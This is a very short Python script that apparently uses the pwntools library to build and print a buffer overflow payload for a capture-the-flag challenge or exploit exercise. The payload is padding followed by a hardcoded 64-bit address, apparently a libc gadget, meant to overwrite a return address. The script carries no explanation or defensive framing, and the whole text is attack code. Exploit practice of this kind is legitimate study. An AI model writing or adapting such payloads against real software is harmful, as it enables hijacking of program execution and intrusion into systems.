from pwn import *

payload = b"a"*21 + p64(0x7ffff7e9ac81) + b"a"*(135-8)
print(payload)
